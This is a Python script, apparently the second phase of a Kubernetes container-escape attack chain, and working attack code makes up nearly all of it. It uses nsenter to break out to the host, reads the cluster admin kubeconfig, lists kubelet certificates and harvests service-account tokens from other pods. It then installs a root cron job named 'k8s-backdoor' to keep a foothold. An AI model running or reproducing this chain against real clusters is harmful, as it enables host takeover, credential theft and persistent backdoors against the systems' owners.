import subprocess, os, time

HOST_ROOT = "/host"

def run_nsenter(cmd):
    """Run command on host via nsenter"""
    full_cmd = f"nsenter -t 1 -m -u -n -i -p -- bash -c '{cmd}'"
    result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=30)
    return result.stdout, result.stderr

def host_cat(path):
    """Read file from host filesystem"""
    host_path = f"{HOST_ROOT}/{path.lstrip('/')}"
    try:
        with open(host_path) as f:
            return f.read().strip()
    except:
        return None

print("[4] NSEnter Escape to host...")
stdout, stderr = run_nsenter("id")
print(f"  Host identity: {stdout.strip()}")

print("[5] Stealing admin kubeconfig...")
kubeconfig = run_nsenter("cat /etc/kubernetes/admin.conf 2>/dev/null || echo NO_KUBECONFIG")[0]
if kubeconfig and "NO_KUBECONFIG" not in kubeconfig:
    kubeconfig_len = len(kubeconfig)
    print(f"  Admin kubeconfig captured: {kubeconfig_len} bytes")
else:
    print(f"  No admin kubeconfig at /etc/kubernetes/admin.conf")

print("[6] Stealing kubelet certificates...")
files = run_nsenter("ls /var/lib/kubelet/pki/ 2>/dev/null || echo NO_CERTS")[0]
print(f"  Kubelet pki files: {files.strip()[:200]}")

print("[7] Stealing SA tokens from other pods...")
tokens = run_nsenter(
    "find /var/lib/kubelet/pods -name token -path '*/kube-api-access-*' 2>/dev/null | while read f; do "
    "POD=$(echo $f | cut -d/ -f6); "
    "echo \"  $POD: $(head -c 20 $f)...\"; "
    "done 2>/dev/null"
)[0]
print(f"  SA tokens found:\n{tokens.strip()}")

print("[8] Installing crontab persistence...")
cron_result = run_nsenter(
    "mkdir -p /etc/cron.d && "
    "echo '* * * * * root bash -c \"curl -sk https://kubernetes.default.svc >/dev/null 2>&1 && echo pwned\" > /tmp/.k8s-ping' > /etc/cron.d/k8s-backdoor && "
    "cat /etc/cron.d/k8s-backdoor 2>&1"
)[0]
print(f"  Crontab install: {cron_result.strip()}")

print("[+] Attack chain Phase 2 complete!")
